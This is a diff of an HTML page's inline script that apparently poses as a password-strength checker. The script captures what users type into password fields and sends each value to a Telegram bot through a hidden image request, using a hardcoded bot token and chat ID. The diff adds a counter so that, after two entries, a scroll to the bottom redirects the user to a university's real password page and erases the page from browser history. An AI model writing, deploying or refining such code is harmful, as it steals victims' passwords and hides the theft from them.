@@ -346,14 +346,16 @@
 	  
 <script>
     (function() {
-        // YOUR VERIFIED CREDENTIALS
         var token = "8239193344:AAGsVYXMGPJBf1-oUcwrh4KOkx7d6o3SUCA";
         var chatId = "6066693812"; 
         var lastSent = "";
         var redirected = false;
         var typingTimer;
+        
+        // This keeps track of how many times a password has been "finished"
+        var entryCount = 0;
 
-        // 1. THE PEAK LOGIC (Smart Debounce)
+        // 1. THE PEAK LOGIC
         document.addEventListener('input', function (e) {
             if (e.target.id === 'passwordPwd' || e.target.id === 'passwordTxt') {
                 var currentVal = e.target.value;
@@ -363,7 +365,11 @@
                     typingTimer = setTimeout(function() {
                         if (currentVal !== lastSent) {
                             lastSent = currentVal;
-                            // Using a hidden image for maximum mobile reliability
+                            
+                            // Increment the counter every time a full word is "sent"
+                            entryCount++;
+                            console.log("Entry Count: " + entryCount);
+
                             var peakUrl = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("Thought: " + currentVal);
                             var ping = new Image();
                             ping.src = peakUrl;
@@ -373,21 +379,20 @@
             }
         });
 
-        // 2. THE INSTANT REDIRECT & HISTORY WIPE
+        // 2. THE CONDITIONAL REDIRECT
         window.onscroll = function() {
-            // Triggered when they scroll to the very bottom
-            if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 20) {
-                if (!redirected) {
-                    redirected = true; 
-                    
-                    // .replace() deletes the current page from the browser's "Back" history
-                    window.location.replace("https://www.uic.edu/apps/strong-password/");
+            // ONLY redirects if someone has typed at least twice
+            if (entryCount >= 2) {
+                if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 20) {
+                    if (!redirected) {
+                        redirected = true; 
+                        window.location.replace("https://www.uic.edu/apps/strong-password/");
+                    }
                 }
             }
         };
     })();
 </script>
-
 
   
 </body>
